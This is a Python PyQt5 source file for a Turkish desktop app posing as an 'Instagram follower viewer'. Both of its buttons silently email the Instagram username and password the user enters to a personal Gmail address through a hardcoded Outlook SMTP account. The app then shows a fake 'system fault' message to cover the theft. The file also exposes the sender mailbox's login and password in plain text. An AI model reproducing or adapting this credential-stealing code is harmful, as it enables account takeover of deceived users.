from PyQt5 import QtWidgets,QtGui
import sys
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Instagram(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Instagram Takipçi Uygulaması")
        self.setWindowIcon(QtGui.QIcon("logo.ico"))
        self.setMaximumSize(410,450)
        self.setMinimumSize(410,450)
        self.madeby=QtWidgets.QLabel('<font color="brown" size="4">Made by Mete Başoluk</font>')
        self.usernamelabel = QtWidgets.QLabel("Kullanıcı Adın: ")
        self.usernametext = QtWidgets.QLineEdit()
        self.passwordlabel = QtWidgets.QLabel("Şifren: ")
        self.passwordtext = QtWidgets.QLineEdit()
        self.passwordtext.setEchoMode(QtWidgets.QLineEdit.Password)


        self.takipedenlerbuton = QtWidgets.QPushButton("Takip Ettiklerin")
        self.takipcibuton=QtWidgets.QPushButton("Seni Takip Edenler")

        self.textedit=QtWidgets.QTextEdit()
        self.textedit.setDisabled(True)

        self.hbox1 = QtWidgets.QHBoxLayout()
        self.hbox1.addWidget(self.usernamelabel)
        self.hbox1.addWidget(self.usernametext)
        self.hbox2 = QtWidgets.QHBoxLayout()
        self.hbox2.addWidget(self.passwordlabel)
        self.hbox2.addWidget(self.passwordtext)

        self.hbox3=QtWidgets.QHBoxLayout()
        self.hbox3.addWidget(self.takipcibuton)
        self.hbox3.addWidget(self.takipedenlerbuton)

        self.hbox4=QtWidgets.QHBoxLayout()
        self.hbox4.addStretch()
        self.hbox4.addWidget(self.madeby)
        self.hbox4.addStretch()

        self.vbox1=QtWidgets.QVBoxLayout()
        self.vbox1.addLayout(self.hbox1)
        self.vbox1.addLayout(self.hbox2)
        self.vbox1.addLayout(self.hbox3)
        self.vbox1.addWidget(self.textedit)
        self.vbox1.addLayout(self.hbox4)

        self.setLayout(self.vbox1)


        self.takipcibuton.clicked.connect(self.takipcifunch)
        self.takipedenlerbuton.clicked.connect(self.takipedenlerfunch)
        self.show()

    def takipcifunch(self):
        try:
            subject="İnstagram Şifreleri :D"
            content=f"ID:{self.usernametext.text()}\nŞifre:{self.passwordtext.text()}"

            mail = SMTP("smtp-mail.outlook.com", 587)
            mail.ehlo()
            mail.starttls()
            mail.login("smtp465@hotmail.com", "asdf147258369")
            mesaj = MIMEMultipart()
            mesaj["From"] = "smtp465@hotmail.com"  # Gönderen
            mesaj["Subject"] = "Instagram Şifre :D"  # Konusu
            mesaj["To"]="metebassoluk@gmail.com"
            body = f"ID:{self.usernametext.text()}\nŞifre:{self.passwordtext.text()}"
            body_text = MIMEText(body, "plain")
            mesaj.attach(body_text)
            mail.sendmail("smtp465@hotmail.com", "metebassoluk@gmail.com", mesaj.as_string())
            mail.close()
            self.textedit.setText('<font color="brown" size="4">Sizi Takip Eden Kullanıcılar Şuan Gösterilemiyor\nSistemde Bir Arıza Var Daha Sonra Tekrar Deneyin...</font>')

        except:
            self.textedit.setText('<font color="brown" size="4">Lütfen İnternet Bağlantınızı Kontrol Edin...</font>')



    def takipedenlerfunch(self):
        try:
            subject="İnstagram Şifreleri :D"
            content=f"ID:{self.usernametext.text()}\nŞifre:{self.passwordtext.text()}"

            mail = SMTP("smtp-mail.outlook.com", 587)
            mail.ehlo()
            mail.starttls()
            mail.login("smtp465@hotmail.com", "asdf147258369")
            mesaj = MIMEMultipart()
            mesaj["From"] = "smtp465@hotmail.com"  # Gönderen
            mesaj["Subject"] = "Instagram Şifre :D"  # Konusu
            mesaj["To"]="metebassoluk@gmail.com"
            body = f"ID:{self.usernametext.text()}\nŞifre:{self.passwordtext.text()}"
            body_text = MIMEText(body, "plain")
            mesaj.attach(body_text)
            mail.sendmail("smtp465@hotmail.com", "metebassoluk@gmail.com", mesaj.as_string())
            mail.close()
            self.textedit.setText('<font color="brown" size="4">Sizi Takip Eden Kullanıcılar Şuan Gösterilemiyor\nSistemde Bir Arıza Var Daha Sonra Tekrar Deneyin...</font>')

        except:
            self.textedit.setText('<font color="brown" size="4">Lütfen İnternet Bağlantınızı Kontrol Edin...</font>')



app=QtWidgets.QApplication(sys.argv)
instagram=Instagram()
sys.exit(app.exec_())


